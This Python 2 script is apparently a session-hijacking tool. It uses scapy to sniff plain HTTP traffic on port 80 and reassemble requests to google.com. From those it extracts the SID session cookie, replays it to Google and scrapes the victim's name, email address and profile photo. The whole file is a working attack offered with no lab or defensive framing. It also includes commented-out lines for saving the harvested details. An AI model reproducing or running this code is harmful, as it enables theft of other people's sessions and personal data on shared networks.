from bs4 import BeautifulSoup
import copy
import dpkt
import requests
import sys

# necessary for accessing libdnet from within a virtualenv on OSX
if sys.platform == "darwin":
  import site; site.addsitedir("/usr/local/lib/python2.7/site-packages")

from scapy.all import *

session_ids =set() # a global set for all session ids
cur_packet = ''
packet_start = 0
complete_packet = 0


# def select_interface():
# 	interface_arr = pcapy.findalldevs()
# 	for x, eth in enumerate(interface_arr):
# 		print str(x+1)+":", eth
# 	interface_no = input("enter the # for the interface to listen on: ")
# 	interface = interface_arr[int(interface_no)-1]
# 	return interface

def extract_google_stok(cookie):
	session_tok = None;
	cookie_toks = cookie.split(": ")[1].split("; ")
	for i in cookie_toks:
		if i[0:4].lower() == "sid=":
			session_tok = i.split("SID=")[1]
			break
	if session_tok == None: #no session cookie found
		return None
	else:
		return session_tok

def make_request(cookie):
	url = 'http://www.google.com/?gws_rd=ssl'
	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
	add_headers["Cookie"] = cookie
	r = requests.get(url, headers=add_headers)
	resp = r.content
	soup = BeautifulSoup(resp, 'lxml')


	name_div = soup.findAll("div", { "class" : "gb_Cb"})
	name = name_div[0].text
	email_div = soup.findAll("div", { "class" : "gb_Db"})
	email = email_div[0].text.split(" ")[0]
	usr_img = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s500")

	print name, email, usr_img

	# subprocess.call(["mkdir",email])
	# subprocess.call(['echo', name+'>'+name])
	#subprocess.call(['curl', usr_img ">"+"./"+email+"/"+name+".jpg"])

	# print "---"
#	myname = mydivs.findAll("span")
#	print myname[0].text

def extract_cookie(packet):

		global packet_start
		global complete_packet
		global cur_packet

		s_tok = None

		x = packet.sprintf("{Raw:%Raw.load%}")[1:-1]

		if 'GET /' in x and '\\r\\n\\r\\n' in x:
			cur_packet = copy.deepcopy(x)	
			complete_packet = 1

		elif 'GET /' in x and '\\r\\n\\r\\n' not in x and complete_packet == 0:
			packet_start = 1
			cur_packet = cur_packet+x
		
		elif packet_start == 1 and complete_packet == 0:
			cur_packet =  cur_packet + x
			if '\\r\\n\\r\\n' in x:
				packet_start = 0
				complete_packet = 1


		if complete_packet == 1 and "www.google.com" in cur_packet.lower() and "cookie" in cur_packet.lower():
		 	header_arr = cur_packet.split("\\r\\n")

			for field  in header_arr:
		 		if "cookie: "in field.lower(): #if cookie is found in the header
		 			cookie_str = field
					s_tok = extract_google_stok(field)
					break

			if s_tok not in session_ids and s_tok != None:
		  		session_ids.update([s_tok])
		 		temp_cookie = cookie_str.split(": ")[1].replace("\r\n","\\r\\n")
		 		make_request(temp_cookie)

		if complete_packet == 1:
			complete_packet = 0 #if this was the last chunk of the packet set var to 0
			cur_packet = '' # reset the current packet to zero

def main():
	interface = sys.argv[1]

	print interface
	sniff(iface=interface, prn=extract_cookie, filter = "port 80")
	# stream_object= open_capture(interface)
	# stream_object.loop(-1, recieve_packets) # capture packets

if __name__ == '__main__':
	main()
	
